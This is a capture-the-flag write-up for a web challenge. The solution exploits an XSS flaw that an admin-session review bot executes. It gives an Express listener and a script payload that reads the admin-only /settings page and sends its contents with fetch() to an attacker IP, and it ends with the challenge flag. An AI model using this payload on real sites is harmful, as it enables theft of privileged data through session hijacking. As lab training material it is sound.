#### Challenge:

Hi, packet inspector,

do you want to order something? Use our Orderly information system, it is intuitive, fast, reliable and secure! At least that's what we claim in the TV ad. In last few hours it began to act weirdly, but its administrator is on vacation away from civilization (and connectivity).

You will have to break into the [Orderly information system](http://orderly.mysterious-delivery.tcc:23000) and check its configuration.

May the Packet be with you!

---

#### Solution:

- after playing with the `system`, we find out, that the site is `XSS` vulnerable and on top of that, the bot that reviews our custom payload has active admin session. All that we need to do, is to prepare payload that will upon loading fetch the `admin` only page with `flag` and then forward that content to our own server, that can be reachable on our `VPN` client IP (the hardest thing here is crawling/guessing the `/settings` page)

- local `HTTP` server used for forwarding
```js
var express = require('express')
var bp = require('body-parser')
var cors = require('cors')
var app = express()

app.use(cors())
app.use(bp.json())
app.use(bp.urlencoded({ extended: true }))

app.post('*', function (req, res, next) {
    console.log(req.body, req.ip);
    res.json({ msg: 'This is CORS-enabled for all origins!' })
})

app.listen(8000, function () {
    console.log('CORS-enabled web server listening on port 80')
})
```

```html
<script>
    document.addEventListener('DOMContentLoaded', function () {
        let xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", "/settings", false);
        xmlHttp.send(null)

        fetch(
            "http://10.200.0.53:8000/",
            {
                "body": JSON.stringify({ "data": window.location, "text": xmlHttp.responseText, "status": xmlHttp.status }),
                "method": "POST",
                headers: { 'Content-Type': 'application/json' }
            }
        )
    })
</script>
```

---

<details><summary>FLAG:</summary>

```
FLAG{9QVE-0miw-qnwm-ER9m}
```

</details>
<br/>
